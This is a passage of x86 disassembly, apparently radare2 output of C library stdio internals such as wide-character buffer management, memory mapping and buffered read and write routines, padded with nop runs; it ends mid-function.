nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x78
mov esi, dword [arg_8h]
mov edx, dword [esi + 0x1c]
test edx, edx
je 0x8075340
mov eax, dword [esi + 0x38]
test eax, eax
js 0x807532e
mov eax, dword [esi + 0x94]
lea edx, [var_6ch]
mov dword [esp], esi
mov dword [var_4h], edx
call dword [eax + 0x48]
test eax, eax
js 0x807532e
mov eax, dword [var_5ch]
mov edx, 0x2000
and eax, 0xf000
cmp eax, 0x2000
sete al
movzx edi, al
mov eax, dword [var_38h]
test eax, eax
cmovg edx, eax
lea ebx, [edx*4]
mov dword [var_14h], 0
mov dword [var_10h], 0xffffffff
lea eax, [ebx + 0xfff]
mov dword [var_ch], 0x22
mov dword [var_8h], 3
and eax, 0xfffff000
mov dword [esp], 0
mov dword [var_4h], eax
call fcn.080546d0
mov edx, eax
mov eax, 0xffffffff
cmp edx, 0xffffffff
je 0x807530f
lea eax, [ebx + edx]
mov dword [var_ch], 1
mov dword [var_4h], edx
mov dword [var_8h], eax
mov dword [esp], esi
call fcn.08075a60
test edi, edi
jne 0x8075317
mov eax, 1
add esp, 0x78
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [esi + 0x38]
mov dword [esp], eax
call fcn.08079ee0
test eax, eax
je 0x807530a
or dword [esi], 0x200
jmp 0x807530a
xor edi, edi
mov edx, 0x2000
jmp 0x807529d
lea esi, [esi]
mov dword [esp], esi
call fcn.08074f80
jmp 0x8075257
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
xor eax, eax
mov ebp, esp
sub esp, 0x2c
mov dword [var_8h], esi
mov dword [var_4h], edi
mov dword [var_ch], ebx
mov esi, dword [arg_ch]
xor edi, edi
mov ebx, dword [arg_14h]
imul esi, dword [arg_10h]
test esi, esi
je 0x8075416
movzx edx, word [ebx]
mov dword [var_20h], 0
test dx, dx
js 0x80753e0
mov eax, 0
test eax, eax
je 0x80753e0
lea eax, [var_1ch]
mov dword [var_20h], 1
mov dword [var_sp_8h], ebx
mov dword [var_sp_4h], fcn.08074580
mov dword [esp], eax
call section.
movzx edx, word [ebx]
lea esi, [esi]
test dx, dx
jns 0x807545b
mov eax, dword [ebx + 0x5c]
test eax, eax
jne 0x80753f8
mov dword [ebx + 0x5c], 0xffffffff
mov eax, 0xffffffff
inc eax
je 0x8075440
cmp word [ebx], 0
jns 0x8075436
mov eax, dword [var_20h]
test eax, eax
jne 0x8075421
cmp edi, esi
mov eax, dword [arg_10h]
je 0x8075416
mov eax, edi
xor edx, edx
div dword [arg_ch]
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
lea eax, [var_1ch]
mov dword [var_sp_4h], 0
mov dword [esp], eax
call section.
jmp 0x8075408
mov dword [esp], ebx
call fcn.08074580
jmp 0x8075401
mov edx, dword [ebx + 0x94]
mov eax, dword [arg_8h]
mov dword [esp], ebx
mov dword [var_sp_8h], esi
mov dword [var_sp_4h], eax
call dword [edx + 0x1c]
mov edi, eax
jmp 0x80753fb
mov dword [esp], ebx
call fcn.08074540
jmp 0x80753e5
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x2c
mov edi, dword [arg_8h]
mov dword [var_20h], 0
test edi, edi
je 0x807566e
mov esi, dword [arg_ch]
test esi, esi
je 0x807566e
mov eax, dword [arg_14h]
mov dword [var_24h], 0
movzx edx, word [eax]
test dx, dx
js 0x80754d8
mov eax, 0
test eax, eax
je 0x80754d8
mov edx, dword [arg_14h]
lea eax, [var_1ch]
mov dword [var_24h], 1
mov dword [esp], eax
mov dword [var_4h], fcn.08074580
mov dword [var_8h], edx
call section.
mov eax, dword [arg_14h]
movzx edx, word [eax]
test dx, dx
jns 0x807565e
mov eax, dword [arg_14h]
test byte [eax], 0x20
jne 0x8075657
mov edx, dword [arg_8h]
mov ebx, dword [edx]
test ebx, ebx
je 0x80754ff
mov eax, dword [arg_ch]
mov ecx, dword [eax]
test ecx, ecx
jne 0x8075526
mov edx, dword [arg_ch]
mov esi, 0xffffffff
mov dword [edx], 0x78
mov dword [esp], 0x78
call fcn.08050fe0
mov edx, dword [arg_8h]
test eax, eax
mov dword [edx], eax
je 0x8075603
mov eax, dword [arg_14h]
mov edi, dword [eax + 8]
mov esi, dword [eax + 4]
sub edi, esi
test edi, edi
jle 0x807563c
lea esi, [esi]
mov eax, dword [arg_10h]
mov edx, dword [arg_14h]
mov dword [var_8h], edi
mov dword [var_4h], eax
mov eax, dword [edx + 4]
mov dword [esp], eax
call fcn.08077220
test eax, eax
mov dword [var_28h], eax
je 0x8075565
sub eax, esi
lea edi, [eax + 1]
mov eax, dword [var_20h]
mov edx, dword [arg_ch]
add eax, edi
mov ebx, eax
mov dword [var_2ch], eax
mov eax, dword [edx]
inc ebx
cmp ebx, eax
jbe 0x80755aa
add eax, eax
mov edx, dword [arg_8h]
mov esi, 0xffffffff
cmp ebx, eax
cmovb ebx, eax
mov dword [var_4h], ebx
mov eax, dword [edx]
mov dword [esp], eax
call fcn.08051220
test eax, eax
je 0x8075603
mov edx, dword [arg_8h]
mov dword [edx], eax
mov edx, dword [arg_14h]
mov eax, dword [arg_ch]
mov esi, dword [edx + 4]
mov dword [eax], ebx
mov eax, dword [arg_8h]
mov eax, dword [eax]
mov dword [var_4h], esi
mov dword [var_8h], edi
add dword [var_20h], eax
mov edx, dword [var_20h]
mov dword [esp], edx
call fcn.08053770
mov edx, dword [var_2ch]
mov eax, dword [arg_14h]
mov dword [var_20h], edx
mov edx, dword [var_28h]
add dword [eax + 4], edi
test edx, edx
jne 0x80755f5
mov dword [esp], eax
call fcn.0804d9e0
inc eax
je 0x80755f5
mov eax, dword [arg_14h]
mov edi, dword [eax + 8]
mov eax, dword [eax + 4]
mov esi, eax
sub edi, esi
jmp 0x8075540
mov edx, dword [arg_8h]
mov eax, dword [edx]
mov edx, dword [var_2ch]
mov byte [edx + eax], 0
mov esi, edx
mov eax, dword [arg_14h]
cmp word [eax], 0
jns 0x8075632
mov eax, dword [var_24h]
test eax, eax
jne 0x807561d
mov eax, esi
add esp, 0x2c
pop ebx
pop esi
pop edi
leave
ret
lea eax, [var_1ch]
mov dword [var_4h], 0
mov dword [esp], eax
call section.
jmp 0x8075613
mov dword [esp], eax
call fcn.08074580
jmp 0x807560c
mov dword [esp], eax
mov esi, 0xffffffff
call fcn.0804d9e0
inc eax
je 0x8075603
mov edx, dword [arg_14h]
mov edi, dword [edx + 8]
mov esi, dword [edx + 4]
jmp 0x80755ee
mov esi, 0xffffffff
jmp 0x8075603
mov edx, dword [arg_14h]
mov dword [esp], edx
call fcn.08074540
jmp 0x80754e1
call fcn.08048b20
mov dword [eax], 0x16
mov eax, 0xffffffff
jmp 0x8075615
push ebp
mov ebp, esp
push edi
push esi
xor esi, esi
push ebx
sub esp, 0x20
mov dword [var_20h], 0x80a2b24
mov eax, dword [arg_ch]
mov edi, dword [arg_8h]
cmp eax, 0x20
je 0x80756bd
cmp eax, 0x30
mov dword [var_20h], 0x80a2b34
je 0x80756bd
mov ebx, 0xf
mov esi, esi
mov byte [ebx + ebp - 0x1c], al
dec ebx
jns 0x80756b0
lea eax, [var_1ch]
mov dword [var_20h], eax
mov ebx, dword [arg_10h]
cmp ebx, 0xf
jg 0x80756ec
test ebx, ebx
jle 0x80756e2
mov eax, dword [edi + 0x94]
mov edx, dword [var_20h]
mov dword [esp], edi
mov dword [var_8h], ebx
mov dword [var_4h], edx
call dword [eax + 0x1c]
add esi, eax
add esp, 0x20
mov eax, esi
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [edi + 0x94]
mov edx, dword [var_20h]
mov dword [esp], edi
mov dword [var_8h], 0x10
mov dword [var_4h], edx
call dword [eax + 0x1c]
add esi, eax
cmp eax, 0x10
jne 0x80756e2
sub ebx, 0x10
cmp ebx, 0xf
jg 0x80756ec
jmp 0x80756c5
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0x20
cmp dword [arg_14h], 2
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov dword [var_4h], edi
mov ebx, dword [arg_ch]
mov esi, dword [arg_10h]
mov edi, dword [arg_8h]
ja 0x80757e7
mov ecx, dword [arg_18h]
test ecx, ecx
je 0x8075790
mov ecx, dword [edi + 0x5c]
test ecx, ecx
js 0x80757de
test ecx, ecx
jle 0x8075790
mov eax, dword [edi + 0x58]
mov eax, dword [eax + 0x20]
test eax, eax
je 0x8075790
cmp dword [arg_14h], 1
je 0x80757c7
test ecx, ecx
js 0x80757bd
mov dword [esp], edi
call fcn.080761d0
mov edx, dword [arg_18h]
mov eax, dword [edi + 0x94]
mov dword [esp], edi
mov dword [var_sp_4h], ebx
mov dword [var_sp_8h], esi
mov dword [var_10h], edx
mov edx, dword [arg_14h]
mov dword [var_sp_ch], edx
call dword [eax + 0x24]
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
mov dword [esp], edi
call fcn.0804d7f0
jmp 0x8075790
test byte [edi + 1], 1
je 0x8075784
test ecx, ecx
jg 0x80757fe
mov eax, dword [edi + 8]
sub eax, dword [edi + 4]
cdq
sub ebx, eax
sbb esi, edx
jmp 0x8075784
mov edx, dword [edi + 0x24]
test edx, edx
jne 0x807577e
jmp 0x8075770
call fcn.08048b20
mov edx, 0xffffffff
mov dword [eax], 0x16
mov eax, 0xffffffff
jmp 0x80757b2
call fcn.08062c50
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x28
mov dword [var_20h], 0
mov esi, dword [var_sp_ch]
mov edi, dword [var_sp_4h]
mov ebx, dword [var_sp_8h]
movzx edx, word [edi]
test dx, dx
js 0x8075860
mov eax, 0
test eax, eax
je 0x8075860
lea eax, [var_1ch]
mov dword [var_20h], 1
mov dword [esp + 8], edi
mov dword [esp + 4], 0x8074580
mov dword [esp], eax
call section.
movzx edx, word [edi]
nop
lea esi, [esi]
test dx, dx
jns 0x80758c0
mov eax, dword [var_ch]
mov dword [esp + 4], ebx
mov dword [esp + 8], esi
mov dword [esp], edi
mov dword [var_10h_2], eax
mov eax, dword [var_10h]
mov dword [esp + 0xc], eax
call fcn.08075740
cmp word [edi], 0
mov ebx, eax
mov esi, edx
jns 0x80758b5
mov edi, dword [var_20h]
test edi, edi
jne 0x80758a0
add esp, 0x28
mov eax, ebx
mov edx, esi
pop ebx
pop esi
pop edi
leave
ret
lea eax, [var_1ch]
mov dword [esp + 4], 0
mov dword [esp], eax
call section.
jmp 0x8075894
mov dword [esp], edi
call fcn.08074580
jmp 0x807588d
nop
mov dword [esp], edi
call fcn.08074540
jmp 0x8075865
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
xor esi, esi
push ebx
sub esp, 0x50
mov dword [var_50h], str.________________0000000000000000
mov eax, dword [arg_ch]
mov edi, dword [arg_8h]
cmp eax, 0x20
je 0x807593d
cmp eax, 0x30
mov dword [var_50h], 0x80a2ba0
je 0x807593d
mov ebx, 0xf
mov esi, esi
mov dword [ebp + ebx*4 - 0x4c], eax
dec ebx
jns 0x8075930
lea eax, [var_4ch]
mov dword [var_50h], eax
mov ebx, dword [arg_10h]
cmp ebx, 0xf
jg 0x807596c
test ebx, ebx
jle 0x8075962
mov eax, dword [edi + 0x94]
mov edx, dword [var_50h]
mov dword [esp], edi
mov dword [var_8h], ebx
mov dword [var_4h], edx
call dword [eax + 0x1c]
add esi, eax
add esp, 0x50
mov eax, esi
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [edi + 0x94]
mov edx, dword [var_50h]
mov dword [esp], edi
mov dword [var_8h], 0x10
mov dword [var_4h], edx
call dword [eax + 0x1c]
add esi, eax
cmp eax, 0x10
jne 0x8075962
sub ebx, 0x10
cmp ebx, 0xf
jg 0x807596c
jmp 0x8075945
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
mov edx, dword [arg_8h]
mov ecx, dword [arg_ch]
mov eax, dword [edx + 0x58]
mov edx, dword [edx + 0x30]
sub ecx, dword [eax + 8]
sar ecx, 2
test edx, edx
je 0x80759ee
lea esi, [esi]
mov eax, dword [edx + 8]
mov edx, dword [edx]
cmp eax, ecx
cmovl ecx, eax
test edx, edx
jne 0x80759e0
mov eax, ecx
leave
ret
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
mov eax, dword [arg_8h]
and dword [eax], 0xfffffeff
mov eax, dword [eax + 0x58]
mov ecx, dword [eax + 4]
mov edx, dword [eax + 0x28]
mov dword [eax + 0x28], ecx
mov dword [eax + 4], edx
mov ecx, dword [eax + 8]
mov edx, dword [eax + 0x20]
mov dword [eax + 0x20], ecx
mov dword [eax + 8], edx
mov dword [eax], edx
leave
ret
nop
lea esi, [esi]
push ebp
mov ebp, esp
push ebx
mov eax, dword [arg_8h]
or dword [eax], 0x100
mov eax, dword [eax + 0x58]
mov ebx, dword [eax + 4]
mov ecx, dword [eax + 0x28]
mov edx, dword [eax + 0x20]
mov dword [eax + 0x28], ebx
mov dword [eax + 4], ecx
mov dword [eax], ecx
mov ebx, dword [eax + 8]
mov dword [eax + 8], edx
mov dword [eax + 0x20], ebx
mov ebx, dword [esp]
leave
ret
nop
push ebp
mov ebp, esp
sub esp, 0x10
mov dword [var_4h], esi
mov dword [var_8h], ebx
mov esi, dword [arg_8h]
mov ecx, dword [esi + 0x58]
mov ebx, dword [ecx + 0x18]
test ebx, ebx
je 0x8075ad0
mov edx, dword [esi]
test dl, 1
je 0x8075aa5
mov eax, dword [arg_ch]
mov dword [ecx + 0x18], eax
mov eax, dword [arg_10h]
mov dword [ecx + 0x1c], eax
mov eax, dword [arg_14h]
test eax, eax
je 0x8075aa0
and edx, 0xfffffffe
mov dword [esi], edx
mov esi, dword [var_4h]
mov ebx, dword [var_8h]
leave
ret
or edx, 1
jmp 0x8075a96
mov eax, dword [ecx + 0x1c]
sub eax, ebx
sar eax, 2
add eax, 0xfff
and eax, 0xfffff000
mov dword [var_sp_4h], eax
mov eax, dword [ecx + 0x18]
mov dword [esp], eax
call fcn.08054780
mov ecx, dword [esi + 0x58]
lea esi, [esi]
mov edx, dword [esi]
jmp 0x8075a80
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x14
mov edi, dword [arg_8h]
mov ecx, dword [edi + 0x58]
mov eax, dword [ecx + 8]
mov ebx, ecx
cmp dword [ecx], eax
jbe 0x8075c18
mov edx, dword [edi]
test dh, 1
jne 0x8075b13
mov esi, dword [edi + 4]
movsx eax, byte [esi - 1]
cmp eax, dword [arg_ch]
je 0x8075c0d
and dh, 1
jne 0x8075b98
mov edx, dword [ebx]
cmp edx, dword [ebx + 8]
jbe 0x8075b8f
mov ecx, dword [ebx + 0x20]
test ecx, ecx
jne 0x8075b7a
mov dword [esp], 0x200
call fcn.08050fe0
mov edx, 0xffffffff
test eax, eax
je 0x8075b70
mov ecx, dword [edi + 0x58]
mov dword [ecx + 0x20], eax
add eax, 0x200
mov dword [ecx + 0x28], eax
mov dword [ecx + 0x24], eax
mov eax, dword [ecx]
mov dword [ecx + 8], eax
mov dword [esp], edi
call fcn.08075a30
mov ecx, dword [edi + 0x58]
mov edx, dword [ecx]
lea eax, [edx - 4]
mov dword [ecx], eax
mov eax, dword [arg_ch]
mov dword [edx - 4], eax
mov edx, dword [arg_ch]
add esp, 0x14
mov eax, edx
pop ebx
pop esi
pop edi
leave
ret
mov eax, edi
call fcn.08076220
mov edx, 0xffffffff
test eax, eax
jne 0x8075b70
mov ecx, dword [edi + 0x58]
jmp 0x8075b50
mov edx, dword [ebx + 0x20]
test edx, edx
jne 0x8075b50
jmp 0x8075b2a
mov eax, dword [ebx + 8]
cmp dword [ebx], eax
ja 0x8075b60
mov esi, dword [ebx + 4]
sub esi, eax
sar esi, 2
lea eax, [esi*8]
lea ebx, [esi + esi]
mov dword [var_14h], eax
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov dword [var_10h], eax
mov edx, 0xffffffff
je 0x8075b70
mov dword [var_8h], esi
sub ebx, esi
mov eax, dword [edi + 0x58]
mov eax, dword [eax + 8]
mov dword [var_4h], eax
mov eax, dword [var_10h]
lea ebx, [eax + ebx*4]
mov dword [esp], ebx
call fcn.080776d0
mov eax, dword [edi + 0x58]
mov eax, dword [eax + 8]
mov dword [esp], eax
call fcn.08051180
mov ecx, dword [edi + 0x58]
mov eax, dword [var_10h]
mov dword [ecx + 8], eax
mov dword [ecx], ebx
mov dword [ecx + 0x24], ebx
add eax, dword [var_14h]
mov dword [ecx + 4], eax
jmp 0x8075b60
lea eax, [esi - 1]
mov dword [edi + 4], eax
jmp 0x8075b6d
mov edx, dword [edi]
jmp 0x8075b13
nop
push ebp
mov ebp, esp
push ebx
sub esp, 8
mov ebx, dword [arg_8h]
mov edx, dword [ebx + 0x58]
mov ecx, dword [edx + 0x18]
test ecx, ecx
je 0x8075c39
test byte [ebx], 1
je 0x8075c91
mov eax, dword [ebx + 0x30]
test eax, eax
je 0x8075c4d
mov dword [eax + 4], 0
mov eax, dword [eax]
test eax, eax
jne 0x8075c40
mov eax, dword [ebx + 0x24]
test eax, eax
jne 0x8075c7d
mov edx, dword [ebx + 0x48]
test edx, edx
je 0x8075c70
mov eax, 0
test eax, eax
je 0x8075c70
mov dword [esp], edx
call section.
lea esi, [esi]
mov dword [arg_8h], ebx
add esp, 8
pop ebx
leave
jmp fcn.0804d500
mov eax, dword [edx + 0x20]
mov dword [esp], eax
call fcn.08051180
mov dword [ebx + 0x24], 0
jmp 0x8075c54
mov eax, dword [edx + 0x1c]
sub eax, ecx
add eax, 0xfff
and eax, 0xfffff000
mov dword [var_4h], eax
mov eax, dword [edx + 0x18]
mov dword [esp], eax
call fcn.08054780
mov edx, dword [ebx + 0x58]
mov dword [edx + 0x1c], 0
mov dword [edx + 0x18], 0
jmp 0x8075c39
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
sub esp, 8
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
mov eax, dword [ebx + 0x94]
mov dword [esp], ebx
call dword [eax + 0x10]
mov edx, 0xffffffff
inc eax
je 0x8075cfe
mov eax, dword [ebx + 0x58]
mov edx, dword [eax]
mov ecx, dword [edx]
add edx, 4
mov dword [eax], edx
mov edx, ecx
mov ebx, dword [var_4h]
mov eax, edx
leave
ret
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
sub esp, 0xc
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
mov eax, dword [ebx + 0x5c]
test eax, eax
je 0x8075d40
mov eax, dword [ebx + 0x94]
mov edx, dword [arg_ch]
mov dword [esp], ebx
mov dword [var_sp_4h], edx
call dword [eax + 0xc]
mov ebx, dword [var_4h]
leave
ret
nop
lea esi, [esi]
mov dword [var_sp_4h], 1
mov dword [esp], ebx
call fcn.08076600
jmp 0x8075d23
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
sub esp, 0xc
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
cmp dword [ebx + 0x5c], 0
jl 0x8075e16
je 0x8075e03
test byte [ebx + 1], 8
jne 0x8075df1
mov ecx, dword [ebx + 0x58]
mov eax, dword [ecx]
cmp eax, dword [ecx + 4]
jb 0x8075de8
test byte [ebx + 1], 1
jne 0x8075dd6
mov eax, dword [ebx + 0x30]
test eax, eax
jne 0x8075dc1
mov eax, dword [ecx + 0x20]
test eax, eax
jne 0x8075db7
mov eax, dword [ebx + 0x94]
mov dword [esp], ebx
call dword [eax + 0x14]
mov edx, eax
mov esi, esi
mov ebx, dword [var_4h]
mov eax, edx
leave
ret
mov dword [esp], ebx
call fcn.080761d0
jmp 0x8075da0
mov edx, dword [ecx + 4]
mov eax, ebx
call fcn.08076220
mov edx, 0xffffffff
test eax, eax
je 0x8075da0
jmp 0x8075db0
mov dword [esp], ebx
call fcn.08075a00
mov ecx, dword [ebx + 0x58]
mov eax, dword [ecx]
cmp eax, dword [ecx + 4]
jae 0x8075d92
mov edx, dword [eax]
add eax, 4
mov dword [ecx], eax
jmp 0x8075db0
mov dword [esp], ebx
call fcn.08076150
mov edx, 0xffffffff
inc eax
jne 0x8075d82
jmp 0x8075db0
mov dword [var_sp_4h], 1
mov dword [esp], ebx
call fcn.08076600
dec eax
je 0x8075e1d
mov edx, 0xffffffff
jmp 0x8075db0
mov eax, dword [ebx + 0x5c]
test eax, eax
jne 0x8075d7c
mov dword [var_sp_4h], 1
mov dword [esp], ebx
call fcn.08076600
jmp 0x8075d7c
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0xc
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
cmp dword [ebx + 0x5c], 0
jl 0x8075ef1
je 0x8075ede
test byte [ebx + 1], 8
jne 0x8075ecc
mov edx, dword [ebx + 0x58]
mov eax, dword [edx]
cmp eax, dword [edx + 4]
jb 0x8075ec8
test byte [ebx + 1], 1
jne 0x8075eb6
mov ecx, dword [ebx + 0x30]
test ecx, ecx
jne 0x8075ea1
mov eax, dword [ebx + 0x24]
test eax, eax
jne 0x8075e97
mov eax, dword [ebx + 0x94]
mov dword [esp], ebx
call dword [eax + 0x10]
mov edx, eax
mov esi, esi
mov ebx, dword [var_4h]
mov eax, edx
leave
ret
mov dword [esp], ebx
call fcn.080761d0
jmp 0x8075e80
mov edx, dword [edx + 4]
mov eax, ebx
call fcn.08076220
mov edx, 0xffffffff
test eax, eax
je 0x8075e80
jmp 0x8075e90
mov dword [esp], ebx
call fcn.08075a00
mov edx, dword [ebx + 0x58]
mov eax, dword [edx]
cmp eax, dword [edx + 4]
jae 0x8075e72
mov edx, dword [eax]
jmp 0x8075e90
mov dword [esp], ebx
call fcn.08076150
mov edx, 0xffffffff
inc eax
jne 0x8075e62
jmp 0x8075e90
mov dword [var_sp_4h], 1
mov dword [esp], ebx
call fcn.08076600
dec eax
je 0x8075ef8
mov edx, 0xffffffff
jmp 0x8075e90
mov eax, dword [ebx + 0x5c]
test eax, eax
jne 0x8075e5c
mov dword [var_sp_4h], 1
mov dword [esp], ebx
call fcn.08076600
jmp 0x8075e5c
nop
lea esi, [esi]
push ebp
xor eax, eax
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x10
mov edi, dword [arg_10h]
mov esi, dword [arg_ch]
test edi, edi
je 0x8075f9c
mov eax, dword [arg_8h]
mov eax, dword [eax + 0x58]
mov ebx, dword [eax + 0x14]
mov dword [var_10h], eax
mov edx, eax
mov eax, dword [eax + 0x10]
sub ebx, eax
sar ebx, 2
test ebx, ebx
jle 0x8075f79
cmp ebx, edi
cmova ebx, edi
cmp ebx, 0x14
jg 0x8075fa8
test ebx, ebx
jle 0x8075fa4
mov edx, ebx
mov ecx, eax
dec edx
js 0x8075f71
mov eax, dword [esi]
add esi, 4
mov dword [ecx], eax
add ecx, 4
dec edx
jns 0x8075f64
mov eax, dword [var_10h]
mov dword [eax + 0x10], ecx
sub edi, ebx
test edi, edi
je 0x8075f97
mov eax, dword [esi]
mov edx, dword [arg_8h]
add esi, 4
mov dword [var_4h], eax
mov dword [esp], edx
call fcn.08075d10
inc eax
je 0x8075f97
dec edi
jmp 0x8075f35
mov eax, dword [arg_10h]
sub eax, edi
add esp, 0x10
pop ebx
pop esi
pop edi
leave
ret
xor ebx, ebx
jmp 0x8075f77
mov dword [var_4h], esi
mov dword [var_8h], ebx
lea esi, [esi + ebx*4]
mov eax, dword [edx + 0x10]
mov dword [esp], eax
call fcn.080539d0
mov edx, dword [var_10h]
mov dword [edx + 0x10], eax
jmp 0x8075f77
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x10
mov esi, dword [arg_ch]
mov eax, dword [arg_10h]
mov dword [var_10h], eax
mov eax, dword [arg_8h]
mov edi, dword [eax + 0x58]
mov ebx, dword [edi + 4]
mov eax, dword [edi]
sub ebx, eax
sar ebx, 2
test ebx, ebx
jle 0x8076022
cmp ebx, dword [var_10h]
cmova ebx, dword [var_10h]
cmp ebx, 0x14
jg 0x807604c
test ebx, ebx
jle 0x8076048
mov edx, ebx
mov ecx, eax
dec edx
js 0x807601d
lea esi, [esi]
mov eax, dword [ecx]
add ecx, 4
mov dword [esi], eax
add esi, 4
dec edx
jns 0x8076010
mov dword [edi], ecx
sub dword [var_10h], ebx
mov eax, dword [var_10h]
test eax, eax
je 0x8076037
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08075e40
inc eax
jne 0x8075fe2
mov eax, dword [var_10h]
sub dword [arg_10h], eax
mov eax, dword [arg_10h]
add esp, 0x10
pop ebx
pop esi
pop edi
leave
ret
xor ebx, ebx
jmp 0x807601f
mov dword [var_8h], ebx
mov eax, dword [edi]
mov dword [esp], esi
mov dword [var_4h], eax
call fcn.080539d0
mov esi, eax
mov eax, dword [arg_8h]
mov edx, dword [eax + 0x58]
lea eax, [ebx*4]
add dword [edx], eax
jmp 0x807601f
jmp fcn.08076080
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0x14
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
mov edx, dword [ebx + 0x58]
mov eax, dword [edx + 0x18]
test eax, eax
jne 0x80760b0
test byte [ebx], 2
jne 0x80760b8
mov eax, dword [edx + 0xb8]
mov dword [esp], ebx
call dword [eax + 0x34]
inc eax
je 0x80760b5
lea esi, [esi]
mov ebx, dword [var_4h]
leave
ret
mov edx, dword [ebx + 0x58]
lea eax, [edx + 0xb8]
mov dword [var_ch], 0
mov dword [esp], ebx
mov dword [var_8h], eax
lea eax, [edx + 0xb4]
mov dword [var_sp_4h], eax
call fcn.08075a60
jmp 0x80760b0
mov esi, esi
push ebp
mov ebp, esp
sub esp, 0x18
mov dword [var_14h], 0
mov dword [var_10h], 0xffffffff
mov dword [var_ch], 0x22
mov dword [var_8h], 3
mov dword [var_4h], 0x2000
mov dword [esp], 0
call fcn.080546d0
mov edx, eax
mov eax, 0xffffffff
cmp edx, 0xffffffff
je 0x807614c
lea eax, [edx + 0x8000]
mov dword [var_ch], 1
mov dword [var_4h], edx
mov dword [var_8h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08075a60
mov eax, 1
leave
ret
mov esi, esi
push ebp
mov ebp, esp
sub esp, 0xc
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
mov edx, dword [ebx + 0x58]
mov eax, dword [edx + 0xc]
cmp dword [edx + 0x10], eax
ja 0x80761a0
mov ecx, dword [ebx]
test ch, 1
je 0x807618d
mov eax, dword [edx + 0x24]
mov dword [edx + 8], eax
mov eax, dword [edx + 0x10]
and ch, 0xf7
mov dword [ebx], ecx
mov dword [edx], eax
mov dword [edx + 0x14], eax
mov dword [edx + 0xc], eax
xor edx, edx
mov ebx, dword [var_4h]
mov eax, edx
leave
ret
mov eax, dword [edx + 0x18]
mov dword [edx + 8], eax
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 4]
jbe 0x8076174
mov dword [edx + 4], eax
jmp 0x8076174
mov eax, dword [edx + 0xb8]
mov dword [esp], ebx
mov dword [var_sp_4h], 0xffffffff
call dword [eax + 0xc]
mov edx, 0xffffffff
inc eax
je 0x8076186
mov edx, dword [ebx + 0x58]
jmp 0x8076167
jmp fcn.080761d0
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 8
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
test byte [ebx + 1], 1
jne 0x807620d
mov eax, dword [ebx + 0x58]
mov eax, dword [eax + 0x20]
mov dword [esp], eax
call fcn.08051180
mov eax, dword [ebx + 0x58]
mov dword [eax + 0x20], 0
mov dword [eax + 0x28], 0
mov dword [eax + 0x24], 0
mov ebx, dword [var_4h]
leave
ret
mov dword [esp], ebx
call fcn.08075a00
jmp 0x80761e2
mov esi, esi
lea edi, [edi]
push ebp
mov ebp, esp
push edi
mov edi, eax
push esi
push ebx
sub esp, 0x1c
mov dword [var_10h], edx
mov dword [var_4h], edx
mov dword [esp], eax
call fcn.080759c0
mov edx, dword [edi + 0x58]
mov ebx, dword [var_10h]
mov esi, eax
sub ebx, dword [edx + 8]
sar ebx, 2
sub ebx, eax
mov eax, dword [edx + 0x28]
sub eax, dword [edx + 0x20]
sar eax, 2
cmp ebx, eax
ja 0x8076305
sub eax, ebx
test esi, esi
mov dword [var_14h], eax
js 0x80762bd
